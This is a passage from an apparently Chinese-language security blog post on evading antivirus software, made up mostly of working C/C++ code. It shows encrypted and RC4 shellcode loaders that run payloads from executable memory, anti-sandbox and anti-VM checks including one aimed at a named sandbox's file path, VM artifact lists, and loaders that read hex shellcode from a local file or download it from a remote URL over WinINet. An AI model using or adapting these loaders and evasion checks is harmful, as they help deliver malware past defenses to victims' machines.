class=\"line\">\tprintf(&quot;[+]Decrypted buffer:\\n&quot;);</span><br><span class=\"line\">\tfor (int i &#x3D; 0; i &lt; ShellcodeSize; i++) &#123;</span><br><span class=\"line\">\t\tprintf(&quot;\\\\x%02x&quot;, shellcode[i]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchar *Memory;</span><br><span class=\"line\">\tMemory &#x3D; (char *)VirtualAlloc(NULL, sizeof(ShellcodeSize), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\t&#x2F;&#x2F;memcpy(Memory, shellcode, sizeof(ShellcodeSize));</span><br><span class=\"line\">\tRtlMoveMemory(Memory, shellcode, ShellcodeSize);</span><br><span class=\"line\">\t((void(*)())Memory)();</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"rc4\"><a href=\"#rc4\" class=\"headerlink\" title=\"rc4\"></a>rc4</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">#define size_b 256</span><br><span class=\"line\">unsigned char sbox[257] &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;初始化s表</span><br><span class=\"line\">void init_sbox(unsigned char* key) &#123;</span><br><span class=\"line\">    unsigned int i, j, k;</span><br><span class=\"line\">    int tmp;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class=\"line\">        sbox[i] &#x3D; i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    j &#x3D; k &#x3D; 0;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class=\"line\">        tmp &#x3D; sbox[i];</span><br><span class=\"line\">        j &#x3D; (j + tmp + key[k]) % size_b;</span><br><span class=\"line\">        sbox[i] &#x3D; sbox[j];</span><br><span class=\"line\">        sbox[j] &#x3D; tmp;</span><br><span class=\"line\">        if (++k &gt;&#x3D; strlen((char*)key))k &#x3D; 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;加解密函数</span><br><span class=\"line\">void enc_dec(unsigned char* key, unsigned char* data) &#123;</span><br><span class=\"line\">    int i, j, k, R, tmp;</span><br><span class=\"line\">    init_sbox(key);</span><br><span class=\"line\"></span><br><span class=\"line\">    j &#x3D; k &#x3D; 0;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; strlen((char*)data); i++) &#123;</span><br><span class=\"line\">        j &#x3D; (j + 1) % size_b;</span><br><span class=\"line\">        k &#x3D; (k + sbox[j]) % size_b;</span><br><span class=\"line\"></span><br><span class=\"line\">        tmp &#x3D; sbox[j];</span><br><span class=\"line\">        sbox[j] &#x3D; sbox[k];</span><br><span class=\"line\">        sbox[k] &#x3D; tmp;</span><br><span class=\"line\"></span><br><span class=\"line\">        R &#x3D; sbox[(sbox[j] + sbox[k]) % size_b];</span><br><span class=\"line\"></span><br><span class=\"line\">        data[i] ^&#x3D; R;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">\tunsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\">\tunsigned char key[] &#x3D; &quot;hacker_hack&quot;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F; 加密</span><br><span class=\"line\">\tenc_dec(key,buf);</span><br><span class=\"line\">\tprintf(&quot;[+]加密: &quot;);</span><br><span class=\"line\">\tfor (size_t i &#x3D; 0; i &lt; sizeof(buf); i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprintf(&quot;\\\\x%02x&quot;, buf[i]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F; 解密</span><br><span class=\"line\">\tenc_dec(key, buf);</span><br><span class=\"line\">\tprintf(&quot;\\n[+]解密: &quot;);</span><br><span class=\"line\">\tfor (size_t i &#x3D; 0; i &lt; sizeof(buf); i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprintf(&quot;\\\\x%02x&quot;, buf[i]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tLPVOID pMemory &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\tRtlMoveMemory(pMemory, buf, sizeof(buf));</span><br><span class=\"line\">\tHANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);</span><br><span class=\"line\">\tWaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\">\tVirtualFree(pMemory, 0, MEM_RELEASE);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"反调试-沙箱-虚拟机\"><a href=\"#反调试-沙箱-虚拟机\" class=\"headerlink\" title=\"反调试/沙箱/虚拟机\"></a>反调试/沙箱/虚拟机</h1><p><a href=\"https://github.com/ZanderChang/anti-sandbox/tree/master\">Windows对抗沙箱和虚拟机的方法总结</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/mBOfkXm-irfpNZ5PoIOe_w\">https://mp.weixin.qq.com/s/mBOfkXm-irfpNZ5PoIOe_w</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/628376104\">虚拟机检测技术整理</a></p>\n<h2 id=\"沙箱\"><a href=\"#沙箱\" class=\"headerlink\" title=\"沙箱\"></a>沙箱</h2><p>开机时间，temp文件数量，cpu数量，物理内存大小，硬盘大小，进程，注册表，usb连接记录，样本名称，微信/Google程序，命名管道通信，延时执行，加速检测</p>\n<p>开机时间</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void GetUpTime()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DWORD iRunTime &#x3D; GetTickCount();</span><br><span class=\"line\">    DWORD TestTime &#x3D; 1800000; &#x2F;&#x2F; 半个小时开机时间</span><br><span class=\"line\">    if (iRunTime &gt; TestTime) printf(&quot;[+]not vm\\n&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    const int Num1 &#x3D; 1000;</span><br><span class=\"line\">    const int Num2 &#x3D; 1900;</span><br><span class=\"line\">    time_t nowTime;</span><br><span class=\"line\">    time(&amp;nowTime);</span><br><span class=\"line\">    time_t systemUpTime &#x3D; nowTime - (iRunTime &#x2F; Num1);</span><br><span class=\"line\">    struct tm* timeInfo;</span><br><span class=\"line\">    timeInfo &#x3D; localtime(&amp;systemUpTime);</span><br><span class=\"line\">    printf(&quot;开机的时间: %d-%d-%d %02d:%02d:%02d&quot;, timeInfo-&gt;tm_year + Num2,</span><br><span class=\"line\">        timeInfo-&gt;tm_mon + 1, timeInfo-&gt;tm_mday, timeInfo-&gt;tm_hour,</span><br><span class=\"line\">        timeInfo-&gt;tm_min, timeInfo-&gt;tm_sec);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>cpu数量，这里获取的是逻辑核数量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void GetCpu()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    SYSTEM_INFO sysinfo;</span><br><span class=\"line\">    GetSystemInfo(&amp;sysinfo);</span><br><span class=\"line\">    DWORD cpunumber &#x3D; sysinfo.dwNumberOfProcessors;</span><br><span class=\"line\">    DWORD cpumask &#x3D; sysinfo.dwActiveProcessorMask;</span><br><span class=\"line\">    if (cpunumber &gt;&#x3D; 4) printf(&quot;[+]not vm\\n&quot;); &#x2F;&#x2F; 4个逻辑内核</span><br><span class=\"line\"></span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]cpunumber &quot; &lt;&lt; cpunumber &lt;&lt; endl;</span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]cpumask &quot; &lt;&lt; cpumask &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>物理内存大小</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void GetRam()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    MEMORYSTATUSEX meminfo;</span><br><span class=\"line\">    meminfo.dwLength &#x3D; sizeof(meminfo);</span><br><span class=\"line\">    GlobalMemoryStatusEx(&amp;meminfo);</span><br><span class=\"line\">    DWORDLONG raminfo &#x3D; meminfo.ullTotalPhys &#x2F; 1024 &#x2F; 1024;</span><br><span class=\"line\">    if (raminfo &gt; 3072) printf(&quot;[+]not vm\\n&quot;); &#x2F;&#x2F; ram大于3G &#x3D; 1024 * 3</span><br><span class=\"line\"></span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]ramsize &quot; &lt;&lt; raminfo &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>硬盘大小，需要管理员权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void GetDisk()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HANDLE hDrive;</span><br><span class=\"line\">    GET_LENGTH_INFORMATION size;</span><br><span class=\"line\">    DWORD lpBytes;</span><br><span class=\"line\">    </span><br><span class=\"line\">    hDrive &#x3D; CreateFileA(&quot;\\\\\\\\.\\\\PhysicalDrive0&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class=\"line\">    if (hDrive &#x3D;&#x3D; INVALID_HANDLE_VALUE)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        CloseHandle(hDrive);</span><br><span class=\"line\">        cout &lt;&lt; &quot;[+]无法打开该磁盘&quot; &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    DeviceIoControl(hDrive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &amp;size, sizeof(GET_LENGTH_INFORMATION), &amp;lpBytes, NULL);</span><br><span class=\"line\">    CloseHandle(hDrive);</span><br><span class=\"line\">    LONGLONG disksize &#x3D; size.Length.QuadPart &#x2F; 1073741824;</span><br><span class=\"line\">    if (disksize &gt; 100) printf(&quot;[+]not vm\\n&quot;);   &#x2F;&#x2F; 大于 100G</span><br><span class=\"line\"></span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]disksize &quot; &lt;&lt; disksize &lt;&lt; &quot;G&quot; &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>样本名称，有的沙箱会重命名样本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void GetFilename()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char currentProcessPath[MAX_PATH + 1];</span><br><span class=\"line\">    GetModuleFileName(NULL, currentProcessPath, 200);</span><br><span class=\"line\">    if (strstr(currentProcessPath, &quot;shellcode.exe&quot;)) printf(&quot;[+]not vm\\n&quot;);  &#x2F;&#x2F; 没有重名</span><br><span class=\"line\"></span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]filename &quot; &lt;&lt; currentProcessPath &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>usb连接记录  <code>\\HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Enum\\USBSTOR</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void GetUsb()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HKEY hKey;</span><br><span class=\"line\">    DWORD mountedUSBDevicesCount;</span><br><span class=\"line\">    RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;SYSTEM\\\\\\\\ControlSet001\\\\\\\\Enum\\\\\\\\USBSTOR&quot;, 0, KEY_READ, &amp;hKey);</span><br><span class=\"line\">    RegQueryInfoKey(hKey, NULL, NULL, NULL, &amp;mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);</span><br><span class=\"line\">    if (mountedUSBDevicesCount &gt; 1) printf(&quot;[+]not vm\\n&quot;);  &#x2F;&#x2F; usb大于1</span><br><span class=\"line\"></span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]usb &quot; &lt;&lt; mountedUSBDevicesCount &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>加速检测</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;chrono&gt;</span><br><span class=\"line\">#include &lt;thread&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">bool timeSleep() &#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 记录起始时间点</span><br><span class=\"line\">    auto start &#x3D; std::chrono::steady_clock::now();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 休眠 10 秒钟</span><br><span class=\"line\">    std::this_thread::sleep_for(std::chrono::seconds(10));</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 计算经过的时间</span><br><span class=\"line\">    auto end &#x3D; std::chrono::steady_clock::now() - start;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 检查是否至少休眠了 10 秒钟</span><br><span class=\"line\">    if (end &gt;&#x3D; std::chrono::seconds(10)) &#123;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>传参检测</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[]) &#123;</span><br><span class=\"line\">    if (argc &gt;&#x3D; 3) &#123;</span><br><span class=\"line\">        if (atoi(argv[1]) + atoi(argv[2]) &#x3D;&#x3D; 12 &amp;&amp; atoi(argv[1]) * atoi(argv[2]) &#x3D;&#x3D; 35) &#123;</span><br><span class=\"line\">            LoadShellCode();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>路径检测，微步的沙箱貌似存在正则对抗，目录是在 <code>C:\\\\[A-Za-z0-9~!@#$%^&amp;*()_+=\\-,.\\/;&#39;\\[\\]\\\\|&#125;&#123;&quot;:?&gt;&lt;]&#123;7&#125;\\\\</code> 所以直接规避该路径</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void CheckWeibu()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char currentProcessPath[MAX_PATH + 1];</span><br><span class=\"line\">    GetModuleFileName(NULL, currentProcessPath, MAX_PATH + 1);</span><br><span class=\"line\">    string input(currentProcessPath);</span><br><span class=\"line\">    regex pattern(R&quot;(C:\\\\[A-Za-z0-9~!@#$%^&amp;*()_+&#x3D;\\-,.\\&#x2F;;&#39;\\[\\]\\\\|&#125;&#123;&quot;:?&gt;&lt;]&#123;7&#125;\\\\shellcode\\.exe)&quot;);</span><br><span class=\"line\">    smatch matches;</span><br><span class=\"line\">    &#x2F;&#x2F; 符合微步路径</span><br><span class=\"line\">    if (!strstr(currentProcessPath, &quot;Windows&quot;))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (regex_search(input, matches, pattern)) MessageBox(0, &quot;in weibu&quot;, &quot;Caption&quot;, MB_OK);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    cout &lt;&lt; &quot;[+]path &quot; &lt;&lt; currentProcessPath &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>命名管道通信</p>\n<p>暂时挖坑，<a href=\"https://drootkit.github.io/MyArticles/CyberSec/%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%94%B6%E9%9B%86.html\">免杀手法收集</a></p>\n<h2 id=\"调试-虚拟机\"><a href=\"#调试-虚拟机\" class=\"headerlink\" title=\"调试/虚拟机\"></a>调试/虚拟机</h2><p><a href=\"https://mp.weixin.qq.com/s/mBOfkXm-irfpNZ5PoIOe_w\">浅谈反沙箱、反调试技术</a>，这块简单记录下，毕竟是搞免杀的，又不是搞APT的。</p>\n<p>可能存在的进程名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Vmtoolsd.exe</span><br><span class=\"line\">Vmwaretrat.exe</span><br><span class=\"line\">Vmwareuser.exe</span><br><span class=\"line\">Vmacthlp.exe</span><br><span class=\"line\">vboxservice.exe</span><br><span class=\"line\">vboxtray.exe</span><br></pre></td></tr></table></figure>\n\n<p>注册表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">HKLM\\SOFTWARE\\Vmware Inc\\Vmware Tools</span><br><span class=\"line\">HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier</span><br><span class=\"line\">HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Oracle\\VirtualBox Guest Additions</span><br></pre></td></tr></table></figure>\n\n<p>硬盘文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\windows\\System32\\Drivers\\Vmmouse.sys</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\vmtray.dll</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\VMToolsHook.dll</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\vmmousever.dll</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\vmhgfs.dll</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\vmGuestLib.dll</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\VBoxMouse.sys</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\VBoxGuest.sys</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\VBoxSF.sys</span><br><span class=\"line\">C:\\windows\\System32\\Drivers\\VBoxVideo.sys</span><br><span class=\"line\">C:\\windows\\System32\\vboxdisp.dll</span><br><span class=\"line\">C:\\windows\\System32\\vboxhook.dll</span><br><span class=\"line\">C:\\windows\\System32\\vboxoglerrorspu.dll</span><br><span class=\"line\">C:\\windows\\System32\\vboxoglpassthroughspu.dll</span><br><span class=\"line\">C:\\windows\\System32\\vboxservice.exe</span><br><span class=\"line\">C:\\windows\\System32\\vboxtray.exe</span><br><span class=\"line\">C:\\windows\\System32\\VBoxControl.exe</span><br></pre></td></tr></table></figure>\n\n<p>服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">VMTools</span><br><span class=\"line\">Vmrawdsk</span><br><span class=\"line\">Vmusbmouse</span><br><span class=\"line\">Vmvss</span><br><span class=\"line\">Vmscsi</span><br><span class=\"line\">Vmxnet</span><br><span class=\"line\">vmx_svga</span><br><span class=\"line\">Vmware Tools</span><br></pre></td></tr></table></figure>\n\n<p>MAC前缀</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">00:05:69 (Vmware)</span><br><span class=\"line\">00:0C:29 (Vmware)</span><br><span class=\"line\">00:1C:14 (Vmware)</span><br><span class=\"line\">00:50:56 (Vmware)</span><br><span class=\"line\">08:00:27 (VirtualBox)</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"分离静态免杀\"><a href=\"#分离静态免杀\" class=\"headerlink\" title=\"分离静态免杀\"></a>分离静态免杀</h1><p>这里shellcode用的是hex类型</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">fc4883e4f0e8c00000004151415052515648...</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"本地读取\"><a href=\"#本地读取\" class=\"headerlink\" title=\"本地读取\"></a>本地读取</h2><p>本地文件读取shellcode -&gt; 分配内存 -&gt; 内存执行，肯定要搭配其他手法，比如shellcode加密、动态API调用。</p>\n<p>静态免杀版，用的 lazy_importer 项目：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;fstream&gt;</span><br><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\">#include &quot;lazy_importer.hpp&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char hexCharToByte(char character) &#123;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;0&#39;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;a&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;A&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void hexStringToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class=\"line\">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    ifstream ifs;</span><br><span class=\"line\">    ifs.open(&quot;sss.txt&quot;, ios::in);</span><br><span class=\"line\">    if (!ifs.is_open()) &#123; cout &lt;&lt; &quot;[-]open fail&quot; &lt;&lt; endl; return -1; &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    string line;</span><br><span class=\"line\">    getline(ifs, line);</span><br><span class=\"line\">    ifs.close();</span><br><span class=\"line\"></span><br><span class=\"line\">    const size_t length &#x3D; line.length() &#x2F; 2; &#x2F;&#x2F; 字节长度</span><br><span class=\"line\">    unsigned char* buffer &#x3D; (unsigned char*)malloc(length);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 调用函数将十六进制字符串转换为字节型数组</span><br><span class=\"line\">    hexStringToBytes(line, buffer, length);</span><br><span class=\"line\">    char* exec &#x3D; (char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(exec, buffer, length);</span><br><span class=\"line\">    ((void(*) ())exec)();</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>另外在测试时候，发现代码顺序竟然影响免杀效果。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505180337646.png\" alt=\"image-20240505180337646\"></p>\n<h2 id=\"远程加载\"><a href=\"#远程加载\" class=\"headerlink\" title=\"远程加载\"></a>远程加载</h2><p>三种建立http/https的连接方法</p>\n<ol>\n<li>winnet</li>\n<li>winhttp</li>\n<li>socket</li>\n</ol>\n<p>winnet</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;wininet.h&gt;</span><br><span class=\"line\">#pragma comment(lib, &quot;wininet.lib&quot;)</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;fstream&gt;</span><br><span class=\"line\">#include &lt;sstream&gt;</span><br><span class=\"line\">#include &lt;vector&gt;</span><br><span class=\"line\">#include &quot;lazy_importer.hpp&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 将十六进制中的单个字符转换为相应的整数值</span><br><span class=\"line\">unsigned char hexCharToByte(char character) &#123;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;0&#39;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;a&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;A&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 将十六进制字符串转换成字节型数组</span><br><span class=\"line\">void hexStringToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class=\"line\">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">size_t GetUrl_HexContent(LPSTR url, std::vector&lt;unsigned char&gt;&amp; buffer) &#123;</span><br><span class=\"line\">    HINTERNET hInternet, hConnect;</span><br><span class=\"line\">    DWORD bytesRead;</span><br><span class=\"line\">    DWORD bufferSize &#x3D; 0;</span><br><span class=\"line\">    DWORD contentLength &#x3D; 0;</span><br><span class=\"line\">    DWORD index &#x3D; 0;</span><br><span class=\"line\">    DWORD bufferLength &#x3D; sizeof(bufferSize);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 打开一个与互联网的连接</span><br><span class=\"line\">    hInternet &#x3D; InternetOpen(L&quot;User Agent&quot;, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);</span><br><span class=\"line\">    if (hInternet &#x3D;&#x3D; NULL) &#123;</span><br><span class=\"line\">        std::cerr &lt;&lt; &quot;InternetOpen failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 打开一个URL连接</span><br><span class=\"line\">    hConnect &#x3D; InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);</span><br><span class=\"line\">    if (hConnect &#x3D;&#x3D; NULL) &#123;</span><br><span class=\"line\">        std::cerr &lt;&lt; &quot;InternetOpenUrlA failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class=\"line\">        InternetCloseHandle(hInternet);</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 查询HTTP响应头中的内容长度</span><br><span class=\"line\">    HttpQueryInfo(hConnect, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &amp;contentLength, &amp;bufferLength, &amp;index);</span><br><span class=\"line\">    std::vector&lt;char&gt; hexBuffer(contentLength + 1, 0);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 读取URL返回的内容到hexBuffer中</span><br><span class=\"line\">    if (!InternetReadFile(hConnect, &amp;hexBuffer[0], contentLength, &amp;bytesRead)) &#123;</span><br><span class=\"line\">        std::cerr &lt;&lt; &quot;InternetReadFile failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else if (bytesRead &gt; 0) &#123;</span><br><span class=\"line\">        hexBuffer[bytesRead] &#x3D; &#39;\\0&#39;;</span><br><span class=\"line\">        &#x2F;&#x2F; 调整buffer的大小，以便存储转换后的字节数据</span><br><span class=\"line\">        buffer.resize(bytesRead &#x2F; 2);</span><br><span class=\"line\">        &#x2F;&#x2F; 将十六进制字符串转换为字节型数组</span><br><span class=\"line\">        hexStringToBytes(&amp;hexBuffer[0], &amp;buffer[0], bytesRead &#x2F; 2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    InternetCloseHandle(hConnect);</span><br><span class=\"line\">    InternetCloseHandle(hInternet);</span><br><span class=\"line\">    return bytesRead &#x2F; 2;</span><br><span 